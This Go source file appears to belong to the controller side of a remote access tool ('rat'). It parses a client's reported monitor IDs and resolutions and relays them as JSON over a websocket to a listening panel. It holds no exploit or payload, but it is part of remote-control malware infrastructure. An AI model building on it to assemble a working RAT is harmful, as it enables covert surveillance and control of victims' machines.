package main

import (
	"fmt"
	"rat/common"

	"encoding/json"

	"golang.org/x/net/websocket"
)

type MonitorsPacket struct {
}

func (packet MonitorsPacket) GetHeader() common.PacketHeader {
	return common.MonitorsHeader
}

func (packet MonitorsPacket) Write(c *Client) error {
	return nil
}

func (packet MonitorsPacket) Read(c *Client) error {
	len, _ := c.ReadInt()

	c.Monitors = make([]Monitor, len)

	for i := 0; i < len; i++ {
		id, _ := c.ReadInt()
		width, _ := c.ReadInt()
		height, _ := c.ReadInt()

		monitor := Monitor{id, width, height}

		c.Monitors[i] = monitor
	}

	if ws, ok := c.Listeners[common.MonitorsHeader]; ok {
		json, err := json.Marshal(&c.Monitors)

		if err != nil {
			fmt.Println("json:", err)
		}

		event := newEvent(MonitorQueryEvent, c.Id, string(json))

		err = websocket.JSON.Send(ws, &event)

		if err != nil {
			return err
		}
	}

	delete(c.Listeners, common.MonitorsHeader)

	return nil
}
